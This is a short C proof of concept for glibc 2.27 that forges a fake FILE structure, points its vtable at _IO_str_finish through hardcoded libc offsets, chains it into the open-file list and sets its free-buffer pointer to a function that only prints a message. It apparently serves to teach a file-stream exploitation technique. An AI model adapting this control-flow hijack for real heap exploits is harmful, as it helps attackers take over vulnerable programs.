#include <gnu/libc-version.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct _IO_strfile_ {
	FILE file;
	size_t *vtable;
	void *(*_allocate_buffer)(size_t);
	void (*_free_buffer)(void *);
};

void evil_func(char *param) {
	printf("I am an evil function! >:)\n");
	printf("I can also take parameters %s\n", param);
}

// Only works for 2.27 cause' I'm lazy :P
// Really bad function btw I should be using libdl
// Do `objdump -t libc.so.6 > symbs.txt` to get your addresses
char *get_libc_base() { return (char *)(&puts - 0x80a30); }

int main() {
	printf("BTW This is version %s\n", gnu_get_libc_version());
	struct _IO_FILE *real_fp = fopen("lorem_ipsium.txt", "w");
	struct _IO_FILE *fake_fp = malloc(sizeof(struct _IO_strfile_));
	// 0x3e8360 is the offset of _IO_str_finish from the libs base addr
	((struct _IO_strfile_ *)fake_fp)->vtable = (size_t *)(get_libc_base() + 0x3e8360 - 8);

	// Linking
	fake_fp->_chain = real_fp->_chain; // not necessary
	real_fp->_chain = fake_fp;
	fake_fp->_IO_write_ptr = (char *) 1;
	fake_fp->_IO_buf_base = "hehehe...";
	((struct _IO_strfile_ *)fake_fp)->_free_buffer = (void (*)(void *)) &evil_func;
}